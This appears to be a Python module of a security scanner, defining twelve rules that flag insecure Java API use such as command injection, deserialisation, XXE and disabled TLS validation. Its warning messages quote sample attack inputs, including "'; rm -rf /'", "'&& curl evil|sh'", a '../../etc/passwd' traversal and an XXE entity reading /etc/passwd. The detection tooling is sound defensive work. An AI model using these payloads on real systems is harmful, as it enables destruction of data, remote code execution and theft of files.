"""Module 2 rules for Java.

Java programs rarely overflow buffers; their weaknesses are in how APIs are
used: injection into commands and file paths, unsafe deserialisation, weak
cryptography, disabled TLS checks and leaking internal details.
"""

from __future__ import annotations

import re
from typing import Iterable, Optional

from .. import ast_nodes as A
from .base import AstContext, Finding, Rule, RuleMeta, describe, is_credential_name
from .common_rules import built_at_runtime

JAVA = ("java",)


def simple_type(name: str) -> str:
    """'java.util.Random' / 'List<String>' -> 'Random' / 'List'."""
    return name.split("<", 1)[0].strip().split(".")[-1]


def news(ctx: AstContext, *types: str) -> Iterable[A.New]:
    wanted = set(types)
    for node in ctx.ast.walk():
        if isinstance(node, A.New) and not node.is_array and simple_type(node.type) in wanted:
            yield node


def method_calls(ctx: AstContext, *names: str) -> Iterable[A.Call]:
    wanted = set(names)
    for call in ctx.calls():
        if isinstance(call.callee, A.Member) and call.callee.field_name in wanted:
            yield call


def receiver_type(call: A.Call, ctx: AstContext) -> str:
    """Declared type of the object a method is called on ('' when unknown)."""
    if not isinstance(call.callee, A.Member):
        return ""
    obj = call.callee.obj
    if isinstance(obj, A.Identifier):
        sym = ctx.sem.resolved.get(obj.id)
        return simple_type(sym.type) if sym is not None else obj.name
    if isinstance(obj, A.New):
        return simple_type(obj.type)
    return ""


def scope_of(node: A.Node, ctx: AstContext) -> A.Node:
    return ctx.enclosing_function(node) or ctx.ast


def calls_in(scope: A.Node, *names: str) -> list[A.Call]:
    wanted = set(names)
    return [n for n in scope.walk() if isinstance(n, A.Call) and isinstance(n.callee, A.Member)
            and n.callee.field_name in wanted]


def assigned_name(node: A.Node) -> str:
    """Name of the variable / field an expression is stored into (VarDecl or Assignment parent)."""
    parent = node.parent
    while isinstance(parent, A.Cast):
        parent = parent.parent
    if isinstance(parent, A.VarDecl):
        return parent.name
    if isinstance(parent, A.Assignment):
        return A.root_identifier(parent.target) if not isinstance(parent.target, A.Member) \
            else parent.target.field_name
    return ""


def taint_or_built(node: Optional[A.Node], ctx: AstContext) -> tuple[str, str]:
    """('tainted' | 'built' | '', explanation)."""
    tainted, why = ctx.sem.is_tainted(node)
    if tainted:
        return "tainted", why
    how = built_at_runtime(node, ctx)
    return ("built", how) if how else ("", "")


# --------------------------------------------------------------------- JAVA001
class CommandInjectionRule(Rule):
    meta = RuleMeta(
        id="JAVA001", name="OS command injection", level="ast", severity="high",
        category="Injection", cwe="CWE-78",
        description="Runtime.exec() or ProcessBuilder runs a command assembled from runtime values.",
        recommendation="Run a fixed program with an argument array (new ProcessBuilder(\"/usr/bin/ping\", \"-c\", "
                       "\"1\", host)), validate arguments against an allow-list and never invoke 'sh -c'.",
        detects="Call(Runtime.getRuntime().exec, cmd) · New(ProcessBuilder, args) where cmd/args are input-derived "
                "or concatenated",
        languages=JAVA,
    )

    def check(self, ctx: AstContext) -> Iterable[Finding]:
        sites: list[tuple[A.Node, list[A.Node], str]] = []
        for call in method_calls(ctx, "exec"):
            path = A.callee_path(call.callee)
            if "getRuntime" in path or receiver_type(call, ctx) == "Runtime":
                sites.append((call, call.args[:1], "exec"))
        for new in news(ctx, "ProcessBuilder"):
            sites.append((new, new.args, "ProcessBuilder"))
        for call in method_calls(ctx, "command"):
            if receiver_type(call, ctx) == "ProcessBuilder":
                sites.append((call, call.args, "ProcessBuilder"))
        for node, args, subject in sites:
            self.examined += 1
            verdicts = [taint_or_built(a, ctx) + (a,) for a in args]
            hit = next((v for v in verdicts if v[0] == "tainted"), None) or \
                next((v for v in verdicts if v[0] == "built"), None)
            shell = any(re.search(r"\b(sh|bash|cmd(\.exe)?|powershell)\b", A.literal_string(a) or "") or
                        re.search(r"\b(sh|bash)\s+-c\b", " ".join(s.value for s in a.walk()
                                                                if isinstance(s, A.StringLiteral)))
                        for a in args)
            if hit is None:
                continue
            kind, why, _ = hit
            if kind == "tainted":
                msg = (f"{subject} runs an operating-system command containing input-derived data ({why}). An "
                       "attacker can append '; rm -rf /' or '&& curl evil|sh' to run arbitrary commands.")
                severity = "critical"
            else:
                msg = f"{subject} runs a command assembled at runtime ({why}); any user-controlled part allows " \
                      "command injection."
                severity = "high"
            if shell:
                msg += " The command is passed through a shell, so metacharacters are interpreted."
            yield self.finding(ctx, node.line, node.col, msg, severity=severity, evidence=describe(node, ctx),
                               subject=subject, node=node)


# --------------------------------------------------------------------- JAVA002
class DeserializationRule(Rule):
    meta = RuleMeta(
        id="JAVA002", name="Unsafe deserialization", level="ast", severity="high",
        category="Deserialization", cwe="CWE-502",
        description="Objects are deserialised from a stream with ObjectInputStream / XMLDecoder without a class "
                    "allow-list, which lets crafted data run 'gadget chains' (remote code execution).",
        recommendation="Exchange plain data (JSON, protobuf) instead of serialised objects, or install an "
                       "ObjectInputFilter that allows only the expected classes.",
        detects="New(ObjectInputStream | XMLDecoder, stream) without setObjectInputFilter · Call(x.readObject())",
        languages=JAVA,
    )

    def check(self, ctx: AstContext) -> Iterable[Finding]:
        for new in news(ctx, "ObjectInputStream", "XMLDecoder"):
            self.examined += 1
            scope = scope_of(new, ctx)
            if calls_in(scope, "setObjectInputFilter") or calls_in(ctx.ast, "setSerialFilter"):
                continue
            kind, why = taint_or_built(new.args[0] if new.args else None, ctx)
            name = simple_type(new.type)
            reads = [c for c in calls_in(scope, "readObject", "readUnshared")]
            if name == "ObjectInputStream" and not reads:
                continue
            untrusted = kind == "tainted" or any(
                isinstance(c.callee, A.Member) and c.callee.field_name in ("getInputStream", "getReader")
                for c in new.walk() if isinstance(c, A.Call))
            msg = (f"{name} deserialises objects from {'untrusted input (' + why + ')' if kind == 'tainted' else 'a stream'}"
                   f"{' (' + str(len(reads)) + ' readObject() call(s))' if reads else ''} with no ObjectInputFilter. "
                   "Crafted bytes can instantiate gadget classes on the classpath and execute code.")
            yield self.finding(ctx, new.line, new.col, msg, severity="critical" if untrusted else "high",
                               evidence=describe(new, ctx), subject=name, node=new)


# --------------------------------------------------------------------- JAVA003
WEAK_ALGORITHMS = re.compile(r"(?i)^(md2|md4|md5|sha-?1|sha|des|desede|tripledes|rc2|rc4|arcfour|blowfish)(/|$)")


class WeakCryptoRule(Rule):
    meta = RuleMeta(
        id="JAVA003", name="Weak cryptography", level="ast", severity="medium",
        category="Cryptography", cwe="CWE-327",
        description="A broken hash or cipher (MD5, SHA-1, DES, RC4), the insecure ECB mode, or a hard-coded "
                    "encryption key is used.",
        recommendation="Use SHA-256+ for hashing (and PBKDF2/bcrypt/Argon2 for passwords), AES/GCM/NoPadding for "
                       "encryption, and load keys from a key store instead of the source.",
        detects="Call(MessageDigest|Cipher|Mac|KeyGenerator.getInstance, StringLiteral(weak | 'AES' | '*/ECB/*')) "
                "· New(SecretKeySpec, literal bytes)",
        languages=JAVA,
    )

    def check(self, ctx: AstContext) -> Iterable[Finding]:
        for call in method_calls(ctx, "getInstance"):
            if not call.args:
                continue
            owner = A.callee_path(call.callee.obj).split(".")[-1]
            if owner not in ("MessageDigest", "Cipher", "Mac", "KeyGenerator", "SecretKeyFactory", "SSLContext",
                             "Signature", "KeyPairGenerator"):
                continue
            self.examined += 1
            algo = A.literal_string(call.args[0])
            if algo is None:
                continue
            if owner == "SSLContext":
                if re.fullmatch(r"(?i)ssl(v[23])?|tlsv1(\.1)?", algo):
                    yield self.finding(ctx, call.line, call.col,
                                       f"SSLContext.getInstance(\"{algo}\") selects an obsolete protocol version "
                                       "with known attacks (POODLE, BEAST).", cwe="CWE-326",
                                       evidence=describe(call, ctx), subject="getInstance", node=call,
                                       title="Obsolete TLS protocol")
                continue
            if WEAK_ALGORITHMS.match(algo):
                yield self.finding(ctx, call.line, call.col,
                                   f"{owner}.getInstance(\"{algo}\") uses a broken algorithm; collisions or key "
                                   "recovery are practical.", severity="high" if owner == "Cipher" else "medium",
                                   evidence=describe(call, ctx), subject="getInstance", node=call)
            elif owner == "Cipher" and ("/ECB/" in algo.upper() or algo.upper() in ("AES", "DESEDE")):
                yield self.finding(ctx, call.line, call.col,
                                   f"Cipher.getInstance(\"{algo}\") uses ECB mode (the provider default for a "
                                   "bare \"AES\"): identical plaintext blocks give identical ciphertext and leak "
                                   "patterns.", evidence=describe(call, ctx), subject="getInstance", node=call,
                                   title="ECB cipher mode")
        for new in news(ctx, "SecretKeySpec", "DESKeySpec", "IvParameterSpec", "PBEKeySpec"):
            self.examined += 1
            if not new.args:
                continue
            key = new.args[0]
            literal = A.literal_string(key)
            if literal is None and isinstance(key, A.Call) and key.method == "getBytes" and \
                    isinstance(key.callee, A.Member):
                literal = A.literal_string(key.callee.obj)
            if literal is None and isinstance(key, A.Identifier):
                sym = ctx.sem.resolved.get(key.id)
                literal = sym.literal_init if sym is not None else None
            if literal is None and not isinstance(key, A.New):
                continue
            what = "initialisation vector" if simple_type(new.type) == "IvParameterSpec" else "key"
            yield self.finding(ctx, new.line, new.col,
                               f"{simple_type(new.type)} is built from a hard-coded {what}"
                               f"{' (' + repr(literal[:4] + '…') + ')' if literal else ''}; anyone with the "
                               "binary can decrypt the data.", severity="high", cwe="CWE-321",
                               evidence=describe(new, ctx), subject=simple_type(new.type), node=new,
                               title="Hard-coded cryptographic key")


# --------------------------------------------------------------------- JAVA004
SECURITY_CONTEXT = re.compile(r"(?i)(token|password|passwd|secret|key|nonce|salt|session|otp|reset|csrf|auth|iv)")


class InsecureRandomRule(Rule):
    meta = RuleMeta(
        id="JAVA004", name="Insecure randomness", level="ast", severity="low",
        category="Cryptography", cwe="CWE-330",
        description="java.util.Random or Math.random() is predictable; values used as tokens, passwords or keys "
                    "can be guessed. A fixed seed makes any generator fully predictable.",
        recommendation="Use java.security.SecureRandom (or SecureRandom.getInstanceStrong()) for anything "
                       "security-relevant and never seed it with a constant.",
        detects="New(Random | Random(seed)) · Call(Math.random) · Call(x.setSeed, constant) — rank raised inside "
                "token/password/key code",
        languages=JAVA,
    )

    def context_hint(self, node: A.Node, ctx: AstContext) -> str:
        func = ctx.enclosing_function(node)
        for name in (assigned_name(node), func.name if func else ""):
            if name and SECURITY_CONTEXT.search(name):
                return name
        return ""

    def check(self, ctx: AstContext) -> Iterable[Finding]:
        for new in news(ctx, "Random", "SecureRandom"):
            self.examined += 1
            seeded = bool(new.args) and ctx.const_eval(new.args[0]) is not None
            if simple_type(new.type) == "SecureRandom" and not seeded:
                continue
            hint = self.context_hint(new, ctx)
            if seeded:
                msg = f"new {simple_type(new.type)}({describe(new.args[0], ctx)}) uses a constant seed, so every " \
                      "run produces the same sequence."
                severity = "medium"
            else:
                msg = "java.util.Random is a linear congruential generator; 48 bits of state can be recovered " \
                      "from a couple of outputs."
                severity = "medium" if hint else "low"
            if hint:
                msg += f" It is used for '{hint}', which must be unpredictable."
            yield self.finding(ctx, new.line, new.col, msg, severity=severity, evidence=describe(new, ctx),
                               subject="Random", node=new, cwe="CWE-336" if seeded else None)
        for call in ctx.calls():
            path = A.callee_path(call.callee)
            if path == "Math.random":
                self.examined += 1
                hint = self.context_hint(call, ctx)
                yield self.finding(ctx, call.line, call.col,
                                   "Math.random() uses a shared java.util.Random and is predictable"
                                   + (f"; it is used for '{hint}'." if hint else "."),
                                   severity="medium" if hint else "low", evidence=describe(call, ctx),
                                   subject="random", node=call)
            elif isinstance(call.callee, A.Member) and call.callee.field_name == "setSeed" and call.args and \
                    ctx.const_eval(call.args[0]) is not None:
                self.examined += 1
                yield self.finding(ctx, call.line, call.col,
                                   f"{path}({describe(call.args[0], ctx)}) seeds the generator with a constant; the "
                                   "output sequence is the same on every run.", severity="medium", cwe="CWE-336",
                                   evidence=describe(call, ctx), subject="setSeed", node=call)


# --------------------------------------------------------------------- JAVA005
FILE_TYPES = ("File", "FileInputStream", "FileOutputStream", "FileReader", "FileWriter", "RandomAccessFile",
              "PrintWriter", "ZipFile")
FILE_CALLS = {"Paths.get", "Path.of", "Files.newInputStream", "Files.newOutputStream", "Files.readAllBytes",
              "Files.readAllLines", "Files.readString", "Files.write", "Files.writeString", "Files.delete",
              "Files.copy", "Files.move", "Files.newBufferedReader", "Files.newBufferedWriter", "Files.lines"}


class PathTraversalRule(Rule):
    meta = RuleMeta(
        id="JAVA005", name="Path traversal", level="ast", severity="high",
        category="Path manipulation", cwe="CWE-22",
        description="A file path is built from user input, so '../' sequences can reach files outside the "
                    "intended directory.",
        recommendation="Resolve the path, call normalize()/getCanonicalPath() and verify it still starts with the "
                       "allowed base directory; better, map user choices to fixed file names.",
        detects="New(File | FileInputStream | FileReader | …, tainted) · Call(Paths.get | Files.*, tainted)",
        languages=JAVA,
    )

    def check(self, ctx: AstContext) -> Iterable[Finding]:
        sites: list[tuple[A.Node, list[A.Node], str]] = [(n, n.args, simple_type(n.type)) for n in news(ctx, *FILE_TYPES)]
        sites += [(c, c.args, A.callee_path(c.callee)) for c in ctx.calls() if A.callee_path(c.callee) in FILE_CALLS]
        for node, args, what in sites:
            self.examined += 1
            if what == "PrintWriter" and args and not isinstance(args[0], (A.StringLiteral, A.BinaryOp, A.Identifier)):
                continue  # new PrintWriter(outputStream) is not a path
            for arg in args:
                tainted, why = ctx.sem.is_tainted(arg)
                if not tainted:
                    continue
                scope = scope_of(node, ctx)
                if calls_in(scope, "getCanonicalPath", "normalize", "toRealPath") and \
                        calls_in(scope, "startsWith"):
                    break  # canonicalised and checked against a base directory
                yield self.finding(ctx, node.line, node.col,
                                   f"{what} opens a path containing input-derived data ({why}). A value such as "
                                   "'../../etc/passwd' escapes the intended directory.",
                                   evidence=describe(node, ctx), subject=what, node=node)
                break


# --------------------------------------------------------------------- JAVA006
WRITE_METHODS = {"print", "println", "write", "printf", "format", "append"}
ENCODERS = re.compile(r"(?i)(escape|encode|sanitiz|htmlEscape|forHtml|clean)")


class XssRule(Rule):
    meta = RuleMeta(
        id="JAVA006", name="Cross-site scripting (XSS)", level="ast", severity="high",
        category="Injection", cwe="CWE-79",
        description="Request data is written into the HTTP response without HTML encoding, so a crafted link can "
                    "run JavaScript in the victim's browser.",
        recommendation="Encode output for its context (OWASP Java Encoder Encode.forHtml, or a template engine "
                       "with auto-escaping) and set a Content-Security-Policy.",
        detects="Call(response.getWriter().print|write|…, tainted) · writer obtained from getWriter() used with "
                "tainted data",
        languages=JAVA,
    )

    @staticmethod
    def is_response_writer(call: A.Call, ctx: AstContext) -> bool:
        obj = call.callee.obj
        if any(isinstance(n, A.Call) and n.method in ("getWriter", "getOutputStream") for n in obj.walk()):
            return True
        if isinstance(obj, A.Identifier):
            sym = ctx.sem.resolved.get(obj.id)
            if sym is None:
                return False
            decl = next((n for n in ctx.ast.walk() if n.id == sym.node_id), None)
            init = getattr(decl, "init", None)
            return init is not None and any(isinstance(n, A.Call) and n.method in ("getWriter", "getOutputStream")
                                            for n in init.walk())
        return False

    def check(self, ctx: AstContext) -> Iterable[Finding]:
        for call in method_calls(ctx, *WRITE_METHODS):
            if not self.is_response_writer(call, ctx):
                continue
            self.examined += 1
            for arg in call.args:
                tainted, why = ctx.sem.is_tainted(arg)
                if not tainted:
                    continue
                if any(isinstance(n, A.Call) and ENCODERS.search(A.callee_path(n.callee)) for n in arg.walk()):
                    break
                yield self.finding(ctx, call.line, call.col,
                                   f"The HTTP response is written with input-derived data ({why}) without HTML "
                                   "encoding; a value such as <script>…</script> executes in the user's browser.",
                                   evidence=describe(call, ctx), subject=call.callee.field_name, node=call)
                break


# --------------------------------------------------------------------- JAVA007
XML_FACTORIES = {"DocumentBuilderFactory", "SAXParserFactory", "XMLInputFactory", "TransformerFactory",
                 "SchemaFactory", "SAXTransformerFactory", "XMLReaderFactory"}


class XxeRule(Rule):
    meta = RuleMeta(
        id="JAVA007", name="XML external entities (XXE)", level="ast", severity="high",
        category="Injection", cwe="CWE-611",
        description="An XML parser factory is created without disabling DTDs / external entities, so a crafted "
                    "document can read local files or make server-side requests.",
        recommendation="Call factory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true) "
                       "(or XMLConstants.FEATURE_SECURE_PROCESSING / ACCESS_EXTERNAL_DTD = \"\") before parsing.",
        detects="Call(DocumentBuilderFactory|SAXParserFactory|XMLInputFactory|….newInstance()) with no "
                "setFeature/setProperty/setAttribute in the same method",
        languages=JAVA,
    )

    def check(self, ctx: AstContext) -> Iterable[Finding]:
        for call in method_calls(ctx, "newInstance", "newFactory", "newDefaultInstance", "createXMLReader"):
            owner = A.callee_path(call.callee.obj).split(".")[-1]
            if owner not in XML_FACTORIES:
                continue
            self.examined += 1
            scope = scope_of(call, ctx)
            if calls_in(scope, "setFeature", "setProperty", "setAttribute", "setExpandEntityReferences"):
                continue
            yield self.finding(ctx, call.line, call.col,
                               f"{owner}.{call.callee.field_name}() creates an XML parser that still resolves "
                               "external entities; <!ENTITY x SYSTEM \"file:///etc/passwd\"> would be expanded.",
                               evidence=describe(call, ctx), subject=owner, node=call)


# --------------------------------------------------------------------- JAVA008
def returns_true(body: Optional[A.Node]) -> bool:
    if isinstance(body, A.KeywordLiteral):
        return body.value == "true"
    if isinstance(body, A.Compound) and len(body.items) == 1 and isinstance(body.items[0], A.Return):
        value = body.items[0].value
        return isinstance(value, A.KeywordLiteral) and value.value == "true"
    return False


class TrustAllTlsRule(Rule):
    meta = RuleMeta(
        id="JAVA008", name="Disabled TLS validation", level="ast", severity="high",
        category="Cryptography", cwe="CWE-295",
        description="A TrustManager accepts every certificate or a HostnameVerifier accepts every host, which "
                    "removes protection against man-in-the-middle attacks.",
        recommendation="Use the platform default TrustManager / HostnameVerifier; pin certificates if a private "
                       "CA is needed instead of disabling checks.",
        detects="FunctionDef(checkServerTrusted, body = { }) · FunctionDef(verify) / Lambda returning true passed "
                "to setHostnameVerifier · ALLOW_ALL_HOSTNAME_VERIFIER / NoopHostnameVerifier",
        languages=JAVA,
    )

    def check(self, ctx: AstContext) -> Iterable[Finding]:
        for node in ctx.ast.walk():
            if isinstance(node, A.FunctionDef) and node.name in ("checkServerTrusted", "checkClientTrusted"):
                self.examined += 1
                if node.body is not None and not node.body.items:
                    yield self.finding(ctx, node.line, node.col,
                                       f"{node.name}() has an empty body, so every certificate — including an "
                                       "attacker's self-signed one — is trusted.", evidence=f"FunctionDef("
                                       f"{node.name}) → Block{{ }}", subject=node.name, node=node,
                                       title="Trust-all certificate manager")
            elif isinstance(node, A.FunctionDef) and node.name == "verify" and len(node.params) == 2 and \
                    "SSLSession" in node.params[1].type:
                self.examined += 1
                if returns_true(node.body):
                    yield self.finding(ctx, node.line, node.col,
                                       "HostnameVerifier.verify() always returns true, so a certificate for any "
                                       "domain is accepted.", evidence="FunctionDef(verify) → Return(true)",
                                       subject="verify", node=node, title="Hostname verification disabled")
            elif isinstance(node, A.Call) and node.method in ("setHostnameVerifier", "setDefaultHostnameVerifier"):
                self.examined += 1
                arg = node.args[0] if node.args else None
                name = A.callee_path(arg) if arg is not None else ""
                if (isinstance(arg, A.Lambda) and returns_true(arg.body)) or \
                        re.search(r"ALLOW_ALL|NoopHostnameVerifier|INSTANCE", name or ""):
                    yield self.finding(ctx, node.line, node.col,
                                       f"{node.method}() installs a verifier that accepts every host name.",
                                       evidence=describe(node, ctx), subject=node.method, node=node,
                                       title="Hostname verification disabled")
            elif isinstance(node, A.New) and simple_type(node.type) in ("NoopHostnameVerifier",
                                                                         "AllowAllHostnameVerifier"):
                self.examined += 1
                yield self.finding(ctx, node.line, node.col,
                                   f"{simple_type(node.type)} disables host name verification.",
                                   evidence=describe(node, ctx), subject=simple_type(node.type), node=node,
                                   title="Hostname verification disabled")


# --------------------------------------------------------------------- JAVA009
LOG_METHODS = {"info", "debug", "warn", "warning", "error", "trace", "fine", "finer", "finest", "severe", "log",
               "println", "print", "printf"}


class InfoExposureRule(Rule):
    meta = RuleMeta(
        id="JAVA009", name="Sensitive information exposure", level="ast", severity="low",
        category="Information exposure", cwe="CWE-209",
        description="Stack traces or credential values are written to output or logs, revealing internals or "
                    "secrets to attackers and log readers.",
        recommendation="Log through a logging framework with a generic message for the user; never log "
                       "passwords, tokens or keys (mask them).",
        detects="Call(e.printStackTrace()) · Call(logger.info|System.out.println|…, credential-named Identifier)",
        languages=JAVA,
    )

    def check(self, ctx: AstContext) -> Iterable[Finding]:
        for call in ctx.calls():
            if not isinstance(call.callee, A.Member):
                continue
            method = call.callee.field_name
            if method == "printStackTrace":
                self.examined += 1
                in_catch = any(isinstance(a, A.Catch) for a in call.ancestors())
                yield self.finding(ctx, call.line, call.col,
                                   f"{A.callee_path(call.callee)}() prints the full stack trace (class names, "
                                   "file paths, library versions)" + (" from an exception handler" if in_catch
                                                                      else "") + "; in a server it can reach the "
                                   "client or shared logs.", evidence=describe(call, ctx),
                                   subject="printStackTrace", node=call)
            elif method in LOG_METHODS:
                self.examined += 1
                for arg in call.args:
                    secret = next((n for n in arg.walk() if isinstance(n, A.Identifier) and
                                   is_credential_name(n.name) and ctx.sem.resolved.get(n.id) is not None and
                                   ctx.sem.resolved[n.id].kind in ("variable", "parameter", "field")), None)
                    if secret is not None:
                        yield self.finding(ctx, call.line, call.col,
                                           f"'{secret.name}' is written to {A.callee_path(call.callee)}(); "
                                           "credentials in logs are readable by anyone with log access.",
                                           severity="medium", cwe="CWE-532", evidence=describe(call, ctx),
                                           subject=secret.name, node=call, title="Credential written to log")
                        break


# --------------------------------------------------------------------- JAVA010
class OpenRedirectRule(Rule):
    meta = RuleMeta(
        id="JAVA010", name="Open redirect", level="ast", severity="medium",
        category="Injection", cwe="CWE-601",
        description="The redirect target comes from the request, so attackers can craft links on your domain "
                    "that forward victims to a phishing site.",
        recommendation="Redirect only to relative paths or to an allow-list of known destinations.",
        detects="Call(response.sendRedirect, tainted) · Call(setHeader(\"Location\", tainted))",
        languages=JAVA,
    )

    def check(self, ctx: AstContext) -> Iterable[Finding]:
        for call in method_calls(ctx, "sendRedirect", "setHeader", "addHeader"):
            self.examined += 1
            method = call.callee.field_name
            if method != "sendRedirect":
                if len(call.args) < 2 or (A.literal_string(call.args[0]) or "").lower() not in ("location", "refresh"):
                    continue
                target = call.args[1]
            else:
                target = call.args[0] if call.args else None
            tainted, why = ctx.sem.is_tainted(target)
            if tainted:
                yield self.finding(ctx, call.line, call.col,
                                   f"{method}() sends the browser to a location taken from the request ({why}).",
                                   evidence=describe(call, ctx), subject=method, node=call)


# --------------------------------------------------------------------- JAVA011
REFLECTION_CALLS = {"forName", "loadClass", "getMethod", "getDeclaredMethod", "getField", "getDeclaredField",
                    "newInstance", "lookup"}


class UnsafeReflectionRule(Rule):
    meta = RuleMeta(
        id="JAVA011", name="Unsafe reflection / code injection", level="ast", severity="high",
        category="Injection", cwe="CWE-470",
        description="A class, method or script chosen by the user is loaded or evaluated, letting attackers "
                    "instantiate arbitrary classes or run code.",
        recommendation="Map user input to an allow-list of known classes/handlers; never evaluate user-supplied "
                       "scripts or expressions.",
        detects="Call(Class.forName | loadClass | getMethod | ScriptEngine.eval | InitialContext.lookup, tainted)",
        languages=JAVA,
    )

    def check(self, ctx: AstContext) -> Iterable[Finding]:
        for call in ctx.calls():
            method = call.method or call.func_name
            if method not in REFLECTION_CALLS and method != "eval":
                continue
            self.examined += 1
            arg = call.args[0] if call.args else None
            tainted, why = ctx.sem.is_tainted(arg)
            if not tainted:
                continue
            if method == "eval":
                msg, cwe, title = (f"{A.callee_path(call.callee)}() evaluates code containing input-derived data "
                                   f"({why}); the attacker's script runs with the application's rights.",
                                   "CWE-94", "Code injection")
            elif method == "lookup":
                msg, cwe, title = (f"JNDI lookup() of an input-derived name ({why}) can load remote classes "
                                   "(the Log4Shell technique).", "CWE-74", "JNDI injection")
            else:
                msg, cwe, title = (f"{A.callee_path(call.callee)}() resolves a class/member named by input "
                                   f"({why}).", None, None)
            yield self.finding(ctx, call.line, call.col, msg, severity="critical" if method in ("eval", "lookup")
                               else "high", cwe=cwe, title=title, evidence=describe(call, ctx), subject=method,
                               node=call)


# --------------------------------------------------------------------- JAVA012
class InsecureCookieRule(Rule):
    meta = RuleMeta(
        id="JAVA012", name="Insecure cookie", level="ast", severity="low",
        category="Session management", cwe="CWE-614",
        description="A cookie is created without the Secure and HttpOnly flags, so it can travel over plain HTTP "
                    "or be stolen by injected JavaScript.",
        recommendation="Call cookie.setSecure(true) and cookie.setHttpOnly(true) (and set SameSite) before "
                       "adding it to the response.",
        detects="VarDecl(c = New(Cookie)) without c.setSecure(true) / c.setHttpOnly(true) in the same method",
        languages=JAVA,
    )

    def check(self, ctx: AstContext) -> Iterable[Finding]:
        for new in news(ctx, "Cookie"):
            self.examined += 1
            name = assigned_name(new)
            if not name:
                continue
            scope = scope_of(new, ctx)
            flags = {c.callee.field_name for c in calls_in(scope, "setSecure", "setHttpOnly")
                     if A.root_identifier(c.callee.obj) == name and c.args and
                     isinstance(c.args[0], A.KeywordLiteral) and c.args[0].value == "true"}
            missing = [f for f in ("setSecure", "setHttpOnly") if f not in flags]
            if not missing:
                continue
            sensitive = any(SECURITY_CONTEXT.search(a.value) for a in new.args if isinstance(a, A.StringLiteral)) \
                or SECURITY_CONTEXT.search(name)
            yield self.finding(ctx, new.line, new.col,
                               f"Cookie '{name}' is created without {' and '.join(m + '(true)' for m in missing)}.",
                               severity="medium" if sensitive else "low",
                               cwe="CWE-614" if "setSecure" in missing else "CWE-1004",
                               evidence=describe(new, ctx), subject="Cookie", node=new)


JAVA_RULES = [CommandInjectionRule, DeserializationRule, WeakCryptoRule, InsecureRandomRule, PathTraversalRule,
              XssRule, XxeRule, TrustAllTlsRule, InfoExposureRule, OpenRedirectRule, UnsafeReflectionRule,
              InsecureCookieRule]
